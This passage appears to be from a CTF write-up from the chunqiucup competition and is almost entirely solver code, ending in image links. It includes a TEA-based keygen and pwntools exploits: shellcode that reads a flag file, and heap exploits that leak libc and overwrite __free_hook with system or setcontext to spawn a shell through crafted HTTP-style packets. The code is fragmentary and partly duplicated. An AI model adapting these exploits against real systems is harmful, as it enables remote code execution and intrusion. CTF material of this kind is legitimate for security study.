flag = "flag{" + s.decode().translate(str.maketrans(b64table, mytable)) + "}"
print(flag)
value = [0,0,0,0,0]
def hash():
    t = 0
    t &= 0x1f
    t ^= (value[0] & 0x1f00000) >> (4 * 5)
    t ^= (value[0] & 0xf8000) >> (3 * 5)
    t ^= (value[0] & 0x7c00) >> (2 * 5)
    t ^= (value[0] & 0x3e0) >> (1 * 5)
    t ^= (value[0] & 0x1f) >> (0 * 5)

    print(t)
    value[4] |= t << (4 * 5) 
    t = 0
    t &= 0x1f
    t ^= (value[1] & 0x1f00000) >> (4 * 5)
    t ^= (value[1] & 0xf8000) >> (3 * 5)
    t ^= (value[1] & 0x7c00) >> (2 * 5)
    t ^= (value[1] & 0x3e0) >> (1 * 5)
    t ^= (value[1] & 0x1f) >> (0 * 5)

    print(t)
    value[4] |= t << (3 * 5) 
    t = 0
    t &= 0x1f
    t ^= (value[2] & 0x1f00000) >> (4 * 5)
    t ^= (value[2] & 0xf8000) >> (3 * 5)
    t ^= (value[2] & 0x7c00) >> (2 * 5)
    t ^= (value[2] & 0x3e0) >> (1 * 5)
    t ^= (value[2] & 0x1f) >> (0 * 5)

    #t ^= (value[2] & 0xf8000) >> (2 * 5)
    print(t)
    value[4] |= t << (2 * 5) 
    t = 0

    t &= 0x1f
    t ^= (value[3] & 0x1f00000) >> (4 * 5)
    t ^= (value[3] & 0xf8000) >> (3 * 5)
    t ^= (value[3] & 0x7c00) >> (2 * 5)
    t ^= (value[3] & 0x3e0) >> (1 * 5)
    t ^= (value[3] & 0x1f) >> (0 * 5)

    #t ^= (value[1] & 0xf8000) >> (1 * 5)
    print(t)
    value[4] |= t << (1 * 5)
    t = 0
    for i in range(4):
        t ^= (value[i] & 0x1f00000) >> (4 * 5)
        t ^= (value[i] & 0xf8000) >> (3 * 5)
        t ^= (value[i] & 0x7c00) >> (2 * 5)
        t ^= (value[i] & 0x3e0) >> (1 * 5)
        t ^= (value[i] & 0x1f) >> (0 * 5)
    value[4] |= t << (0 * 5)
hash_value=[0x963541E5, 0x80C0F758, 0x0C30C975, 0x9F6D867D]
value = [0 for i in range(5)]
ch = "23456789ABCDEFGHJKLMNPQRSTUVWXYZ"
# L5FQH-8QPJB-X95NE-SXKFQ-7W3HR
# chunqiucup
# 
def trans(v):
    for i in range(5):
        t = (v >> ((4-i)*5)) & 31
        print(ch[t],end="")

def tea_encrypt(v, k):
    v0 = v[0] & 0x1ffffff
    v1 = v[1] & 0x1ffffff
    x = 0
    delta = 0x13c6a7e
    k0 = (hash_value[0] & 0xfe000000) >> 25 | (hash_value[2] & 0xfe000000) >> (25 - 7)
    k1 = (hash_value[1] & 0xfe000000) >> 25 | (hash_value[3] & 0xfe000000) >> (25 - 7)
    k2 = (hash_value[2] & 0x1ffffff)
    k3 = (hash_value[3] & 0x1ffffff)
    for i in range(32):
        x += delta
        x = x & 0x1ffffff
        v0 += ((v1 << 4) + k0) ^ (v1 + x) ^ ((v1 >> 5) + k1)
        v0 = v0 & 0x1ffffff
        v1 += ((v0 << 4) + k2) ^ (v0 + x) ^ ((v0 >> 5) + k3)
        v1 = v1 & 0x1ffffff
    v[0] = v0
    v[1] = v1
    return v
def tea_decrypt(v, k):
    v0 = v[0] & 0x1ffffff
    v1 = v[1] & 0x1ffffff
    x = (0x13c6a7e * 32) & 0x1ffffff
    delta = 0x13c6a7e
    k0 = (hash_value[0] & 0xfe000000) >> 25 | (hash_value[2] & 0xfe000000) >> (25 - 7)
    k1 = (hash_value[1] & 0xfe000000) >> 25 | (hash_value[3] & 0xfe000000) >> (25 - 7)
    k2 = (hash_value[2] & 0x1ffffff)
    k3 = (hash_value[3] & 0x1ffffff)
    print("0x%.8x,0x%.8x,0x%.8x,0x%.8x"%(k0,k1,k2,k3))
    for i in range(32):
        v1 -= ((v0 << 4) + k2) ^ (v0 + x) ^ ((v0 >> 5) + k3)
        v1 = v1 & 0x1ffffff
        v0 -= ((v1 << 4) + k0) ^ (v1 + x) ^ ((v1 >> 5) + k1)
        v0 = v0 & 0x1ffffff
        x -= delta
        x = x & 0x1ffffff
    v[0] = v0
    v[1] = v1
    return v

def check3_1():
    value[0] = (hash_value[0] & 0x1ffffff)^ 18151210 #Ada_Lovelace Birth
    

def hash():
    t = 0
    t &= 0x1f
    t ^= (value[0] & 0x1f00000) >> (4 * 5)
    t ^= (value[0] & 0xf8000) >> (3 * 5)
    t ^= (value[0] & 0x7c00) >> (2 * 5)
    t ^= (value[0] & 0x3e0) >> (1 * 5)
    t ^= (value[0] & 0x1f) >> (0 * 5)

    print(t)
    value[4] |= t << (4 * 5) 
    t = 0
    t &= 0x1f
    t ^= (value[1] & 0x1f00000) >> (4 * 5)
    t ^= (value[1] & 0xf8000) >> (3 * 5)
    t ^= (value[1] & 0x7c00) >> (2 * 5)
    t ^= (value[1] & 0x3e0) >> (1 * 5)
    t ^= (value[1] & 0x1f) >> (0 * 5)

    print(t)
    value[4] |= t << (3 * 5) 
    t = 0
    t &= 0x1f
    t ^= (value[2] & 0x1f00000) >> (4 * 5)
    t ^= (value[2] & 0xf8000) >> (3 * 5)
    t ^= (value[2] & 0x7c00) >> (2 * 5)
    t ^= (value[2] & 0x3e0) >> (1 * 5)
    t ^= (value[2] & 0x1f) >> (0 * 5)

    print(t)
    value[4] |= t << (2 * 5) 
    t = 0

    t &= 0x1f
    t ^= (value[3] & 0x1f00000) >> (4 * 5)
    t ^= (value[3] & 0xf8000) >> (3 * 5)
    t ^= (value[3] & 0x7c00) >> (2 * 5)
    t ^= (value[3] & 0x3e0) >> (1 * 5)
    t ^= (value[3] & 0x1f) >> (0 * 5)

    print(t)
    value[4] |= t << (1 * 5)
    t = 0
    for i in range(4):
        t ^= (value[i] & 0x1f00000) >> (4 * 5)
        t ^= (value[i] & 0xf8000) >> (3 * 5)
        t ^= (value[i] & 0x7c00) >> (2 * 5)
        t ^= (value[i] & 0x3e0) >> (1 * 5)
        t ^= (value[i] & 0x1f) >> (0 * 5)
    value[4] |= t << (0 * 5)
    
def solve():
    value[0] = (hash_value[0] & 0x1ffffff)^ 18151210 #Ada_Lovelace Birth
    value[1] = (hash_value[1] & 0x1ffffff)^ (10*2**20 + 23*2**15 + 8*2**10 + 10*2**5 +17) #CRACK
    plain = [0x1852,0x1127]
    key = [0xffffffff,0xffffffff,0xffffffff,0xffffffff]
    print("0x%.8x,0x%.8x,0x%.8x,0x%.8x"%(hash_value[0],hash_value[1],hash_value[2],hash_value[3]))
    decrypted = tea_decrypt(plain, key)
    value[2],value[3] = decrypted
    
    hash()
    print("0x%.8x,0x%.8x,0x%.8x,0x%.8x,0x%.8x"%(value[0],value[1],value[2],value[3],value[4]))
    for i in range(5):
        trans(value[i])
        print("-",end='')
    

solve()
from pwn import *

context.arch = 'amd64'
p = remote("", )

shellcode = b'xcc'
shellcode += asm(shellcraft.open("/home/chal/flag")) + asm(shellcraft.read(3, 'rsp', 0x40)) + asm(shellcraft.write(1, 'rsp', 0x40))

p.sendlineafter("?", str(len(shellcode)).encode())
p.send(shellcode)

p.interactive()
add(1,0x418,"123")
add(2,0x18,"123")
delete(1)
add(3,0x600,"123")
add(1,0x418,"123")
show(1)
p.recvuntil("Here Is The Adventure Log:n")
p.recv(8)
libcaddr = u64(p.recv(8))-0x1ebfd0
print(hex(libcaddr))
heapaddr = u64(p.recv(8))-0x2d0
print(hex(heapaddr))
add(3,0x648,payload)
payload1 = p64(0)*4+p64(0x670)
add(4,0x28,payload1)
add(5,0x4f0,"123")
add(6,0x28,"123")
edit(4,payload1)
delete(5)
add(7,0x68,"123")
add(8,0x68,"123")
delete(8)
delete(7)
payload=p64(0)*2+p64(free_hook)
edit(3,payload)
add(9,0x68,"/bin/shx00")
add(10,0x68,p64(system))
delete(9)
payload = "POST /bin/sh HTTP1.1rn"

payload += "abc: 123rn"

payload += content
add(16,0,"0n")

show(0)

delete(0)

show(0)
from pwn import*
    #p = process("./program")
p=remote("127.0.0.1","8888")
elf = ELF("./libc.so",checksec=False)
def add(size,idx,content):
    payload = "POST /bin/sh HTTP1.1rn"
    payload += "abc: 123rn"
    payload += chr(1)+"&"+str(idx)+"&"+str(size)+"&"+content+"x00"
    p.sendlineafter("Waiting Package...",payload)
def edit(idx,content):
    payload = "POST /bin/sh HTTP1.1rn"
    payload += "abc: 123rn"
    payload += chr(2)+"&"+str(idx)+"&"+content+"x00"
    p.sendlineafter("Waiting Package...",payload)
    sleep(0.1)
def show(idx):
    payload = "POST /bin/sh HTTP1.1rn"
    payload += "abc: 123rn"
    payload += chr(3)+"&"+str(idx)+"x00"
    p.sendlineafter("Waiting Package...",payload)
    sleep(0.1)
def delete(idx):
    payload = "POST /bin/sh HTTP1.1rn"
    payload += "abc: 123rn"
    payload += chr(4)+"&"+str(idx)+"x00"
    p.sendlineafter("Waiting Package...",payload)
    sleep(0.1)
def DEV():
    payload = "DEV /bin/sh HTTP1.1rn"
    payload += "abc: 123rn"
    payload += "rotartsinimdax00"
    p.sendlineafter("Waiting Package...",payload)
DEV()
add(16,0,"0n")
show(0)
delete(0)
show(0)
p.recvuntil("Content-Length:")
p.recvuntil("n")
addr1=u64(p.recv(5).ljust(8,'x00'))
addr1=addr1<<12
magic = addr1 >> 12
for i in range(8):
    add(0xb8,i+1,"0n")
add(32,9,"0n")
for i in range(8):
    delete(i+1)
edit(8,"1")
show(8)
p.recvuntil("Content-Length:")
p.recvuntil("n")
addr2 = u64(p.recv(6).ljust(8,'x00')) - 0x1E0C31
freehook = addr2 + elf.symbols['__free_hook']
edit(7,p64(freehook^magic))
payload = "/bin/shx00" + p64(addr1+0x740)*3+p64(addr2+elf.symbols['setcontext']+0x4f)
payload = payload.ljust(0x48,'a')
payload+=p64(0)*4
payload = payload.ljust(0xa8,'a')
payload += p64(addr2 + 0xde78c)
add(0xb8,10,payload)
add(0xb8,11,p64(addr2 + 0x14a0a0))
delete(10)
p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/8-1659585210.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/5-1659585210.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/1-1659585211.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/6-1659585211.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/5-1659585212.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/1-1659585212.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/3-1659585212.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/9-1659585213.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/2-1659585213.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/6-1659585214.png)